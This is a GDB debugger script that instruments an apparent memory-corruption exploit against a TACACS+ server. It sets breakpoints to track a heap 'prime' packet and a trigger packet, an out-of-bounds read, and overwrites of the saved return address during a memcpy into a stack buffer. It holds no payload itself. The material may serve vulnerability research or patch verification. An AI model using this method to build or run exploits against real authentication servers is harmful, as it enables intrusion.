set pagination off
set confirm off
set print elements 0
set $prime_in = (char*)0
set $prime_len = 0
# seq>=2 AUTHEN/CONT prime, freed at packet.c:917 and carved by the trigger.
break packet.c:878 if ctx->hdr.tac.type == 1 && ctx->in->length > 1000
commands
 silent
 set $prime_in = (char*)ctx->in
 set $prime_len = ctx->in->length
 printf "PRIME in=%p len=%u\n", $prime_in, $prime_len
 printf "PRIME find cmd=ZZZZ in prime buffer:\n"
 find /b ctx->in, ctx->in+2200, 0x63, 0x6d, 0x64, 0x3d, 0x5a, 0x5a, 0x5a, 0x5a
 continue
end
# Small AUTHOR trigger in a new session.
break author.c:72 if session->ctx->in->length < 200
commands
 silent
 printf "TRIG in=%p base=%p inlen=%u prime_in=%p\n", session->ctx->in, p, session->ctx->in->length, $prime_in
 printf "TRIG OOB at p+820:\n"
 printf "TRIG find cmd= from p over 2KB:\n"
 find /b p, p+2048, 0x63, 0x6d, 0x64, 0x3d
 printf "TRIG 48 bytes at p+1080:\n"
 x/48bx p+1080
 printf "TRIG frame rbp=%p cmdline=%p\n", $rbp, cmdline
 continue
end
break author.c:75 if i == 12
commands
 printf "PRE i=%d l=%u a=%p rbp=%p saved_rbp=%p saved_rip=%p cmdline=%p delta=%ld\n", (int)i, (unsigned)*argsizep, a, $rbp, *(void**)$rbp, *(void**)($rbp+8), cmdline, (long)((char*)$rbp-(char*)cmdline)
 printf "PRE locals i=%p tlen=%p t=%p p=%p argsizep=%p session=%p\n", &i, &tlen, &t, &p, &argsizep, &session
 set $cmd = cmdline
 set $big = 1
 continue
end
# After every memcpy: dump the VLA and control words when the big copy lands.
break author.c:78
commands
 silent
 printf "L78 i=%d tlen=%u cmdoff=%ld\n", (int)i, (unsigned)tlen, (long)((char*)t-cmdline)
 if $big
  set $big = 0
  printf "POST saved_rbp=%p saved_rip=%p\n", *(void**)$rbp, *(void**)($rbp+8)
  printf "POST cmdline dump 300 bytes:\n"
  x/300bx $cmd
  printf "POST stack at rbp-16:\n"
  x/12gx $rbp-16
 end
 continue
end
break author.c:141
commands
 silent
 printf "EVALARGS in=%p base=%p inlen=%u\n", session->ctx->in, p, session->ctx->in->length
 continue
end
run
printf "INFERIOR STOPPED\n"
bt 6
info registers rip rsp rbp
quit
